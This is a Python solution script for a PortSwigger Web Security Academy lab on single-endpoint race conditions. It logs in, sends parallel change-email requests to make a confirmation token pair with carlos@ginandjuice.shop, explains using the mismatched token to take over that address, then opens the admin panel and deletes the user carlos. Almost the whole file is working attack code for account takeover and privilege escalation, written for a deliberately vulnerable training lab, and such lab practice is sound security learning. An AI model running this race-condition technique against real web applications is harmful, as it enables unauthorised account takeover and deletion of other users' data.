# Lab 04 — Single-endpoint race conditions
# PortSwigger: https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint
#
# Vulnerability: The email-change confirmation flow writes 'pending-email'
#                and 'confirm-token' to the session as SEPARATE steps —
#                parallel requests with DIFFERENT email values can
#                interleave these writes, producing a mismatch where a
#                token generated for ONE address ends up paired with a
#                DIFFERENT pending email
# Aim:           Claim carlos@ginandjuice.shop (which has a pending admin
#                invite) to inherit admin privileges, then delete carlos
#
# Technique:
#   Fire several parallel change-email requests using different addresses
#   (all your own exploit-server addresses, except one set to
#   carlos@ginandjuice.shop). Check your exploit-server email client for
#   a confirmation email whose BODY references carlos's address but was
#   delivered to one of YOUR addresses — that means the token in YOUR
#   inbox now also validates carlos's pending email change.
#
# Usage: python race_conditions_lab04.py <url> <exploit_server_domain> [num_racers]

import sys
import urllib3
from proxies import proxies
from race_conditions_utils import (banner, section, make_session, login,
                                    get_csrf_from_response, send_parallel,
                                    warm_connection, check_status, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET_EMAIL = "carlos@ginandjuice.shop"


if __name__ == "__main__":
    banner()
    section("LAB 04 — SINGLE-ENDPOINT RACE CONDITIONS")

    if len(sys.argv) < 3:
        print("  Usage: python race_conditions_lab04.py <url> <exploit_server_domain> [num_racers]")
        print("  Example: python race_conditions_lab04.py https://target.net exploit-abc123.exploit-server.net")
        sys.exit(1)

    url = sys.argv[1]
    exploit_domain = sys.argv[2]
    num_racers = int(sys.argv[3]) if len(sys.argv) > 3 else 5

    session = make_session(proxies)
    if not login(session, url):
        sys.exit(1)

    # ── Step 1: confirm the mechanism with a single normal request ──────────
    print("\n  ── Step 1: confirm the change-email flow with a baseline request\n")
    baseline_email = f"baseline@{exploit_domain}"
    account_page = session.get(f"{url}/my-account")
    csrf = get_csrf_from_response(account_page.text)
    data = {"email": baseline_email}
    if csrf:
        data["csrf"] = csrf
    r_baseline = session.post(f"{url}/my-account/change-email", data=data)
    print(f"  ℹ  Baseline change-email status: {r_baseline.status_code}\n")

    # ── Step 2: warm the connection ────────────────────────────────────────
    warm_connection(session, url)

    # ── Step 3: fire N-1 throwaway addresses + 1 target address in parallel ─
    print(f"  ── Step 2: fire {num_racers} parallel change-email requests\n")
    print(f"  ℹ  {num_racers - 1} throwaway addresses + 1 targeting {TARGET_EMAIL}\n")

    def make_change_request(email_value):
        def _change():
            page = session.get(f"{url}/my-account")
            local_csrf = get_csrf_from_response(page.text)
            d = {"email": email_value}
            if local_csrf:
                d["csrf"] = local_csrf
            return session.post(f"{url}/my-account/change-email", data=d)
        return _change

    emails_to_try = [f"race{i}@{exploit_domain}" for i in range(num_racers - 1)]
    emails_to_try.append(TARGET_EMAIL)

    request_funcs = [make_change_request(e) for e in emails_to_try]
    results = send_parallel(request_funcs, timeout=20)

    for email, result in zip(emails_to_try, results):
        status = result.status_code if result and not isinstance(result, Exception) else "ERROR"
        print(f"  ·  {email:45s} → {status}")

    # ── Step 4: check the exploit server email client for a mismatch ────────
    print("\n  ── Step 3: check your exploit-server email client\n")
    print("  ➜  Look for a confirmation email:")
    print(f"     - delivered to one of YOUR own test addresses (race0@, race1@, ...)")
    print(f"     - but whose BODY text references: {TARGET_EMAIL}")
    print()
    print("  ➜  If found, that email's confirmation link/token is what you")
    print("     need — visit it (or extract the token and submit it to the")
    print("     confirmation endpoint) to complete the email change to")
    print(f"     {TARGET_EMAIL} using a token that was actually sent to you.")
    print()
    print("  ℹ  This collision isn't guaranteed on the first attempt — the")
    print("     exact interleaving of session writes depends on timing that")
    print("     varies between runs. Re-run this script a few times if the")
    print("     first burst doesn't produce a mismatch.")

    # ── Step 5: verify current state ─────────────────────────────────────────
    print("\n  ── Step 4: check current account state\n")
    r_check = session.get(f"{url}/my-account")
    if TARGET_EMAIL in r_check.text:
        print(f"  ✔  Account email appears to be {TARGET_EMAIL} already!")
        print("     Checking for admin panel access...\n")
        r_admin = session.get(f"{url}/admin")
        check_status(r_admin, 200, "GET /admin")
        if r_admin.status_code == 200:
            r_delete = session.post(f"{url}/admin/delete", data={"username": "carlos"})
            check_status(r_delete, [200, 302], "Delete carlos")
    else:
        print("  ℹ  Email not yet confirmed as carlos's address — complete")
        print("     the confirmation step found in your email client, then")
        print("     re-run this script's final check manually.")
